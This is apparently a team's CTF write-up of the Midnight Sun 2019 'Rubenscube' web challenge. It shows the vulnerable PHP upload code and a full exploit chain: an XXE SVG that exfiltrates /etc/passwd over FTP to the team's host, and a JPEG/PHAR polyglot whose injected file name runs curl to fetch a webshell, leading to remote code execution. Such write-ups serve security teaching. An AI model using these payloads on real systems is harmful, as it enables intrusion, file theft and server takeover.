---
layout: post
title:  "Rubenscube - Midnight Sun CTF 2019 Quals"
date:   2019-04-16 13:37
categories: [MidnightSunCTFQuals2019]
tags: [Web]
author: jbz
---

The challenge description was minimal, just telling us about an image sharing service:
```
Sharing is caring. For picture wizard use only.
Service: http://ruben-01.play.midnightsunctf.se:8080
```

### TL;DR ###

This challenge was about exploiting an `XXE` through an `SVG`, then invoke a `PHP Object Injection` through the `XXE` using `phar://` and finally get `RCE`.

### Recon ###

We run a dir scan on the target to see if any juicy file could be found.
```
.gitignore
robots.txt
index.php
upload.php
images/
```
By visiting the `robots.txt` file it was possible to find the path of the zip containing the source code.
```
User-agent: *
Disallow: /harming/humans
Disallow: /ignoring/human/orders
Disallow: /harm/to/self
Disallow: source.zip
```
By visiting the `.gitignore` file it was possible to see that an un-accessible file `flag_dispenser` was present in the webroot.

It took 30 seconds to understand that there was a very easy to trigger `XXE` during `SVG` file parsing.
```
<?php
session_start();

function calcImageSize($file, $mime_type) {
    if ($mime_type == "image/png"||$mime_type == "image/jpeg") {
        $stats = getimagesize($file);  // Doesn't work for svg...
        $width = $stats[0];
        $height = $stats[1];
    } else {
        $xmlfile = file_get_contents($file);
        $dom = new DOMDocument();
        $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
        $svg = simplexml_import_dom($dom);
        $attrs = $svg->attributes();
        $width = (int) $attrs->width;
        $height = (int) $attrs->height;
    }
    return [$width, $height];
}


class Image {

    function __construct($tmp_name)
    {
        $allowed_formats = [
            "image/png" => "png",
            "image/jpeg" => "jpg",
            "image/svg+xml" => "svg"
        ];
        $this->tmp_name = $tmp_name;
        $this->mime_type = mime_content_type($tmp_name);

        if (!array_key_exists($this->mime_type, $allowed_formats)) {
            // I'd rather 500 with pride than 200 without security
            die("Invalid Image Format!");
        }

        $size = calcImageSize($tmp_name, $this->mime_type);
        if ($size[0] * $size[1] > 1337 * 1337) {
            die("Image too big!");
        }

        $this->extension = "." . $allowed_formats[$this->mime_type];
        $this->file_name = sha1(random_bytes(20));
        $this->folder = $file_path = "images/" . session_id() . "/";
    }

    function create_thumb() {
        $file_path = $this->folder . $this->file_name . $this->extension;
        $thumb_path = $this->folder . $this->file_name . "_thumb.jpg";
        system('convert ' . $file_path . " -resize 200x200! " . $thumb_path);
    }

    function __destruct()
    {
        if (!file_exists($this->folder)){
            mkdir($this->folder);
        }
        $file_dst = $this->folder . $this->file_name . $this->extension;
        move_uploaded_file($this->tmp_name, $file_dst);
        $this->create_thumb();
    }
}

new Image($_FILES['image']['tmp_name']);
header('Location: index.php');

```

### XXE ###

Using the following `SVG` file it was possible to confirm the `XXE`:
```
<!DOCTYPE svg [
<!ELEMENT svg ANY >
<!ENTITY % sp SYSTEM "http://jbz.team/">
%sp;
]>
<svg viewBox="0 0 400 400" version="1.2" xmlns="http://www.w3.org/2000/svg" style="fill:red">
      <text x="60" y="15" style="fill:black">PoC for XXE file stealing via SVG rasterization</text>
      <rect x="0" y="0" rx="10" ry="10" width="400" height="400" style="fill:green;opacity:0.3"/>
      <flowRoot font-size="15">
         <flowRegion>
           <rect x="10" y="20" width="380" height="370" style="fill:yellow;opacity:0.3"/>
         </flowRegion>
         <flowDiv>
            <flowPara></flowPara>
         </flowDiv>
      </flowRoot>
</svg>
```

At that point we were like "OK, it's time for a first blood!!11!!1"!
We spawned an `FTP` and an `HTTP` services to retrieve data `OOB` and we weaponized the `SVG` file.

**SVG**
```
<!DOCTYPE svg [
<!ELEMENT svg ANY >
<!ENTITY % sp SYSTEM "http://jbz.team/evil.xml">
%sp;
%param1;
]>
<svg viewBox="0 0 400 400" version="1.2" xmlns="http://www.w3.org/2000/svg" style="fill:red">
      <text x="60" y="15" style="fill:black">PoC for XXE file stealing via SVG rasterization</text>
      <rect x="0" y="0" rx="10" ry="10" width="400" height="400" style="fill:green;opacity:0.3"/>
      <flowRoot font-size="15">
         <flowRegion>
           <rect x="10" y="20" width="380" height="370" style="fill:yellow;opacity:0.3"/>
         </flowRegion>
         <flowDiv>
            <flowPara>&exfil;</flowPara>
         </flowDiv>
      </flowRoot>
</svg>
```
**evil.xml**
```
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://jbz.team/%data;'>">
```

A `php://filter` was used in order to exfiltrate data in base64, which prevents problems with new lines, encoding, etc.

We uploaded the malicious `SVG` and boom we received `/etc/passwd` file via `FTP`:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
messagebus:x:101:101::/var/run/dbus:/bin/false
```

### FLAG ###

We canged the path from `/etc/passswd` in the `evil.xml` file to `/var/www/html/flag_dispenser` and ~~we received the flag~~.

### SADNESS ###

We spent hours trying to read various files to understand wheredaphrack the flag was, without success. We also asked the organizers if everything was working correctly and the answer was always "yes".

### THE IDEA ###

When we were pretty close to give up we remembered about the `phar://` handler which in `PHP` allows to perform a `PHP Object Injection`.

To exploit it we needed:
 - The ability to force the server to visit a phar:// URI, which was possible via the `XXE`
 - The ability to upload a malicious phar archive on the server, which was possible only if the `PHAR` archive was also a valid `JPG` file
 - A gadget for our deserialization exploit, which was present in the`system` function called in the `__destruct` of the `Image` class

### POLYGLOT PHAR ###

Using some Google-fu we found a `PHP` script, which, with very few changes, was used to generate a `PHAR` which was also a valid `JPG` file.
```
<?php
class Image {}

$jpeg_header_size = 
"\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\x01\x01\x00\x48\x00\x48\x00\x00\xff\xfe\x00\x13".
"\x43\x72\x65\x61\x74\x65\x64\x20\x77\x69\x74\x68\x20\x47\x49\x4d\x50\xff\xdb\x00\x43\x00\x03\x02".
"\x02\x03\x02\x02\x03\x03\x03\x03\x04\x03\x03\x04\x05\x08\x05\x05\x04\x04\x05\x0a\x07\x07\x06\x08\x0c\x0a\x0c\x0c\x0b\x0a\x0b\x0b\x0d\x0e\x12\x10\x0d\x0e\x11\x0e\x0b\x0b\x10\x16\x10\x11\x13\x14\x15\x15".
"\x15\x0c\x0f\x17\x18\x16\x14\x18\x12\x14\x15\x14\xff\xdb\x00\x43\x01\x03\x04\x04\x05\x04\x05\x09\x05\x05\x09\x14\x0d\x0b\x0d\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14".
"\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\xff\xc2\x00\x11\x08\x00\x0a\x00\x0a\x03\x01\x11\x00\x02\x11\x01\x03\x11\x01".
"\xff\xc4\x00\x15\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xc4\x00\x14\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xda\x00\x0c\x03".
"\x01\x00\x02\x10\x03\x10\x00\x00\x01\x95\x00\x07\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x05\x02\x1f\xff\xc4\x00\x14\x11".
"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x03\x01\x01\x3f\x01\x1f\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20".
"\xff\xda\x00\x08\x01\x02\x01\x01\x3f\x01\x1f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x06\x3f\x02\x1f\xff\xc4\x00\x14\x10\x01".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x3f\x21\x1f\xff\xda\x00\x0c\x03\x01\x00\x02\x00\x03\x00\x00\x00\x10\x92\x4f\xff\xc4\x00\x14\x11\x01\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x03\x01\x01\x3f\x10\x1f\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda".
"\x00\x08\x01\x02\x01\x01\x3f\x10\x1f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x3f\x10\x1f\xff\xd9";

$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->addFromString("test.txt","test");
$phar->setStub($jpeg_header_size." __HALT_COMPILER(); ?>");
$object = new Image;
$object->tmp_name = '/etc/passwd';
$object->folder = '/tmp';
$object->file_name = 'aaa`curl jbz.team/phpshell.txt > /var/www/html/images/<phpsessid>/a.php`bbb';
$object->extension = 'txt';
$phar->setMetadata($object);
$phar->stopBuffering();
```

The injected `Image` object was used to trigger the command injection in the `system` function:
```
class Image {
    [...]
    
    function create_thumb() {
        $file_path = $this->folder . $this->file_name . $this->extension;
        $thumb_path = $this->folder . $this->file_name . "_thumb.jpg";
        system('convert ' . $file_path . " -resize 200x200! " . $thumb_path);
    }

    function __destruct()
    {
        if (!file_exists($this->folder)){
            mkdir($this->folder);
        }
        $file_dst = $this->folder . $this->file_name . $this->extension;
        move_uploaded_file($this->tmp_name, $file_dst);
        $this->create_thumb();
    }
}
```


### RCE ###

We uploaded the generated polyglot `PHAR` to the server, and then triggered the deserialization via the following `SVG`:
```
<!DOCTYPE svg [
<!ELEMENT svg ANY >
<!ENTITY % data SYSTEM "phar://images/<phpsessid>/<phar_file_name>.jpg">
%data;
]>
<svg viewBox="0 0 400 400" version="1.2" xmlns="http://www.w3.org/2000/svg" style="fill:red">
      <text x="60" y="15" style="fill:black">PoC for XXE file stealing via SVG rasterization</text>
      <rect x="0" y="0" rx="10" ry="10" width="400" height="400" style="fill:green;opacity:0.3"/>
      <flowRoot font-size="15">
         <flowRegion>
           <rect x="10" y="20" width="380" height="370" style="fill:yellow;opacity:0.3"/>
         </flowRegion>
         <flowDiv>
            <flowPara></flowPara>
         </flowDiv>
      </flowRoot>
</svg>
```

And boom we visited the downloaded webshell which executed our commands.

Then it was just a matter of executing `/var/www/html/flag_dispenser`, which happened to be a binary file, executable by anyone, but readable only by `root`, to get the flag:

```Flag: midnight{R3lying_0n_PHP_4lw45_W0rKs}```
